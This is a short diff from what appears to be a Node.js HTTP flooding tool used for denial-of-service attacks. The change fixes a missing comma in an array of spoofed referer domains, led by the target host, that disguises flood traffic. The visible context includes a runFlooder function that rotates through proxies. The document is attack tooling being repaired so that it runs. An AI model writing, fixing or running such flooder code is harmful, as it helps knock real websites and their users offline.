@@ -178,7 +178,7 @@ if (cluster.isMaster) {
 		});
 		return randomStringArray.join('');
 	}
-const refers = [ parsedTarget.host 'google.com', 'youtube.com', 'facebook.com', 'wikipedia.org', 'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com', 'instagram.com', 'linkedin.com', 'ebay.com', 'microsoft.com', 'apple.com', 'twitch.tv', 'hulu.com', 'disneyplus.com', 'espn.com', 'whatsapp.com', 'telegram.com', 'pinterest.com', 'dropbox.com', 'zoom.us', 'bbc.com', 'vk.com', 'dailymotion.com', 'imgur.com', 'spotify.com', 'soundcloud.com', 'stackoverflow.com', 'reuters.com', 'theguardian.com', 'aliexpress.com', 'tiktok.com', 'cnbc.com', 'yandex.ru', 'qq.com', 'baidu.com', 'mail.ru', 'sina.com.cn', 'github.com' ];
+const refers = [ parsedTarget.host, 'google.com', 'youtube.com', 'facebook.com', 'wikipedia.org', 'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com', 'instagram.com', 'linkedin.com', 'ebay.com', 'microsoft.com', 'apple.com', 'twitch.tv', 'hulu.com', 'disneyplus.com', 'espn.com', 'whatsapp.com', 'telegram.com', 'pinterest.com', 'dropbox.com', 'zoom.us', 'bbc.com', 'vk.com', 'dailymotion.com', 'imgur.com', 'spotify.com', 'soundcloud.com', 'stackoverflow.com', 'reuters.com', 'theguardian.com', 'aliexpress.com', 'tiktok.com', 'cnbc.com', 'yandex.ru', 'qq.com', 'baidu.com', 'mail.ru', 'sina.com.cn', 'github.com' ];
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
      const parsedProxy = proxyAddr.split(":");
